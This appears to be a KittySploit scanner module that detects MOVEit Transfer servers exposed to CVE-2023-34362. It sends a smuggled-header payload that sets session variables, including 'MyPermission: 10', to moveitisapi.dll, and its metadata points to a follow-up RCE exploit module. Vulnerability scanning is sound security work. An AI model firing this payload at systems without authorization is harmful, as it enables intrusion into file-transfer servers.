#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect Progress MOVEit Transfer CVE-2023-34362 SQLi surface."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MOVEit Transfer CVE-2023-34362 Detect',
        'description': (
            'Detects Progress MOVEit Transfer instances exposing the CVE-2023-34362 '
            'attack surface: /moveitisapi/moveitisapi.dll?action=m2 header-smuggling '
            'path and guestaccess.aspx guest session workflow.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'cve': ['CVE-2023-34362'],
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-34362',
            'https://www.rapid7.com/blog/post/ra-cve-2023-34362-analysis/',
        ],
        'tags': ['web', 'scanner', 'moveit', 'progress', 'sqli', 'kev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': True,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'chain': {
                'suggested_followups': [
                    'exploits/multi/http/moveit_cve_2023_34362_rce',
                    'scanner/http/moveit_detect',
                ],
            },
        },
    }

    def _moveit_present(self) -> bool:
        for path in ('/human.aspx', '/signon.aspx', '/'):
            r = self.http_request(method='GET', path=path, allow_redirects=True)
            if not r:
                continue
            body = (r.text or '').lower()
            if 'moveit' in body or '/moveitisapi/' in body or 'signon.aspx' in body:
                return True
        return False

    def _m2_surface(self, cookies: str) -> bool:
        headers = {
            'Cookie': cookies,
            'X-siLock-Test': 'abcdX-siLock-Transaction: folder_add_by_path',
            'X-siLock-Transaction': 'session_setvars',
            'X-siLock-SessVar': 'MyPermission: 10',
        }
        r = self.http_request(
            method='GET',
            path='/moveitisapi/moveitisapi.dll?action=m2',
            headers=headers,
            allow_redirects=False,
        )
        if not r:
            return False
        code = int(r.status_code or 0)
        if code not in (200, 302):
            return False
        err = str(r.headers.get('X-siLock-ErrorCode') or r.headers.get('x-silock-errorcode') or '')
        return err == '0' or 'x-silock-username' in '\n'.join(
            f'{k}:{v}'.lower() for k, v in r.headers.items()
        )

    def _csrf_surface(self, cookies: str) -> bool:
        r = self.http_request(
            method='GET',
            path='/guestaccess.aspx?Transaction=dummy&Arg06=probe&Arg12=promptaccesscode',
            headers={'Cookie': cookies},
            allow_redirects=False,
        )
        if not r or int(r.status_code or 0) != 200:
            return False
        return bool(re.search(r'name=["\']csrftoken["\']', r.text or '', re.I))

    def run(self):
        if not self._moveit_present():
            return False
        root = self.http_request(method='GET', path='/', allow_redirects=True)
        cookies = ''
        if root:
            fields = root.headers.get('Set-Cookie') or root.headers.get('set-cookie') or ''
            if isinstance(fields, list):
                cookies = '; '.join(fields)
            else:
                cookies = str(fields)
            for part in cookies.split(';'):
                if 'ASP.NET_SessionId=' in part:
                    cookies = part.split(',', 1)[0].strip()
                    if not cookies.startswith('ASP.NET_SessionId'):
                        cookies = 'ASP.NET_SessionId=' + cookies.split('=', 1)[-1]
                    break
        m2 = self._m2_surface(cookies) if cookies else False
        csrf = self._csrf_surface(cookies) if cookies else False
        if m2 or csrf:
            self.set_info(
                severity='critical',
                cve='CVE-2023-34362',
                reason='MOVEit m2 header-smuggling and guestaccess CSRF surface reachable',
                m2=m2,
                guestaccess=csrf,
            )
            return True
        self.set_info(
            severity='high',
            cve='CVE-2023-34362',
            reason='MOVEit Transfer detected — verify patch level for CVE-2023-34362',
        )
        return True
